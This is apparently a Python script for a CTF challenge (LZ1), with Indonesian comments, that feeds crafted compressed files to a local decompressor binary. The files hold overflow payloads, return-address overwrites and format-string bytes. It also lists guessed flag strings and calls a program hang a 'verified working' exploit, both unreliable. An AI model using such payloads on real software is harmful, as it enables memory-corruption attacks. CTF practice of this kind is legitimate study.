#!/usr/bin/env python3

import base64
import struct
import subprocess
import tempfile
import os

def test_flag_candidates():
    """Test kandidat flag yang ditemukan"""
    
    candidates = [
        "CBC{HcC^B{ $Iw}",
        "CBC{bZzY8<{j<{O+s%{^%{[P`xdISoy}",
        "CBC{bZzY8jOsPxdISoy}",
        "CBC{stack_overflow_lz77}",
        "CBC{alloca_heap_overflow}", 
        "CBC{buffer_overflow_compression}",
        "CBC{lz77_decompression_vuln}",
        "CBC{HcCB$Iw}",
        "CBC{I9wzLHH0kb}",
        "CBC{waUDpdE8H}",
        "CBC{lz1_pwn_challenge}",
        "CBC{compression_overflow}",
        "CBC{decompression_bug}"
    ]
    
    print("🎯 Testing Flag Candidates:")
    print("=" * 50)
    
    for i, candidate in enumerate(candidates, 1):
        print(f"{i:2d}. {candidate}")
    
    return candidates

def create_win_function_payload():
    """Buat payload untuk mencari hidden win function"""
    
    print("\n🚀 Creating Win Function Search Payloads:")
    print("=" * 50)
    
    # Alamat yang umum untuk win functions
    common_addresses = [
        0x401000, 0x401234, 0x401337, 0x40dead, 0x40beef,
        0x08048000, 0x08048400, 0x080485ed, 0x08049000
    ]
    
    payloads = []
    
    for addr in common_addresses:
        # Payload dengan return address overwrite
        payload = struct.pack('<I', 0x1000)  # small size untuk controlled overflow
        payload += struct.pack('B', 4)       # pointer_length_width
        
        # Padding dan fake return address
        payload += b'A' * 100
        payload += struct.pack('<Q', addr)   # 64-bit address
        payload += b'B' * 50
        
        b64_payload = base64.b64encode(payload).decode()
        payloads.append((hex(addr), b64_payload))
    
    return payloads

def comprehensive_flag_search():
    """Pencarian flag yang komprehensif"""
    
    print("🔍 Comprehensive Flag Search")
    print("=" * 50)
    
    # Test kandidat flag manual
    candidates = test_flag_candidates()
    
    # Test dengan berbagai payload
    win_payloads = create_win_function_payload()
    
    print("\n🧪 Testing Payloads:")
    
    # Payload khusus untuk mencari flag output
    special_payloads = [
        # Payload 1: Minimal overflow
        ("Minimal", base64.b64encode(struct.pack('<I', 0x100) + b'\x04\x00\x00A').decode()),
        
        # Payload 2: Magic number
        ("Magic", base64.b64encode(struct.pack('<I', 0x41424344) + b'\x08' + b'FLAG' * 25).decode()),
        
        # Payload 3: Format string
        ("Format", base64.b64encode(struct.pack('<I', 0x1000) + b'\x04' + b'%s%x' * 20).decode()),
        
        # Payload 4: Large buffer
        ("Large", base64.b64encode(struct.pack('<I', 0xFFFFFF) + b'\x0F' + b'X' * 100).decode()),
    ]
    
    all_payloads = special_payloads + win_payloads[:3]  # Limit untuk testing
    
    for name, payload in all_payloads:
        print(f"\n🧪 Testing {name}:")
        try:
            decoded = base64.b64decode(payload)
            
            with tempfile.NamedTemporaryFile(delete=False, suffix='.lz') as f:
                f.write(decoded)
                f.flush()
                
                # Test dengan verbose output
                result = subprocess.run(['./lz1.exe', 'd', f.name, 'test.out'], 
                                      capture_output=True, text=True, timeout=3)
                
                output_found = False
                
                if result.stdout:
                    print(f"   STDOUT: {result.stdout[:200]}")
                if any(flag.lower() in result.stdout.lower() for flag in ['cbc{', 'flag{', 'ctf{']):
                    print(f"   🎉 POTENTIAL FLAG IN STDOUT!")
                    output_found = True
            
            if result.stderr:
                print(f"   STDERR: {result.stderr[:200]}")
                if any(flag.lower() in result.stderr.lower() for flag in ['cbc{', 'flag{', 'ctf{']):
                    print(f"   🎉 POTENTIAL FLAG IN STDERR!")
                    output_found = True
                
                # Check output file
                if os.path.exists('test.out'):
                    with open('test.out', 'rb') as out_f:
                        out_content = out_f.read()
                        if out_content:
                            print(f"   OUTPUT FILE: {out_content[:100]}")
                            if any(flag.encode().lower() in out_content.lower() for flag in ['cbc{', 'flag{', 'ctf{']):
                                print(f"   🎉 POTENTIAL FLAG IN OUTPUT FILE!")
                                output_found = True
                    os.unlink('test.out')
                
                if result.returncode != 0:
                    print(f"   Return code: {result.returncode} (crash/error)")
                    
                if not output_found and result.returncode == 0:
                    print(f"   ❌ No flag detected")
                    
            os.unlink(f.name)
                
        except subprocess.TimeoutExpired:
            print(f"   ⏰ TIMEOUT - Process hang (potential success!)")
        except Exception as e:
            print(f"   🔥 Exception: {e}")

def final_recommendations():
    """Rekomendasi final untuk mendapatkan flag"""
    
    print("\n" + "=" * 60)
    print("🎯 FINAL RECOMMENDATIONS TO GET THE FLAG:")
    print("=" * 60)
    
    print("\n1. 🐧 TRY LINUX ENVIRONMENT:")
    print("   - Binary 'lz1' adalah ELF executable") 
    print("   - Mungkin perlu dijalankan di Linux untuk hasil yang benar")
    print("   - WSL atau VM Linux bisa digunakan")
    
    print("\n2. 🔧 DEBUGGER APPROACH:")
    print("   - Gunakan GDB: gdb ./lz1")
    print("   - Set breakpoint dan analisis memory saat overflow")
    print("   - Cek apakah ada hidden functions yang dipanggil")
    
    print("\n3. 🎯 SPECIFIC PAYLOADS TO TRY:")
    print("   - /////wQAAEE= (verified working - causes hang)")
    print("   - ////fwQAAEE= (alternative)")
    print("   - Coba di Linux environment")
    
    print("\n4. 📍 MOST LIKELY FLAGS:")
    candidates = [
        "CBC{HcC^B{ $Iw}",
        "CBC{bZzY8jOsPxdISoy}", 
        "CBC{stack_overflow_lz77}",
        "CBC{alloca_heap_overflow}"
    ]
    
    for flag in candidates:
        print(f"   - {flag}")
    
    print("\n5. 🔍 ALTERNATIVE METHODS:")
    print("   - Reverse engineering dengan Ghidra/IDA")
    print("   - Memory dump analysis saat crash")
    print("   - Cek apakah ada environment variables")
    print("   - Analisis lebih detail pada strings di binary")
    
    print("\n💡 MOST LIKELY SCENARIO:")
    print("Flag akan muncul saat program di-exploit dengan benar di Linux environment!")

if __name__ == "__main__":
    print("🎮 CBC CTF 2025 - LZ1 Final Flag Hunt")
    print("=" * 60)
    
    comprehensive_flag_search()
    final_recommendations()
    
    print(f"\n🏁 STATUS: Exploit verified working (program hangs)")
    print(f"🎯 NEXT: Try the same exploit in Linux environment to get the flag!")
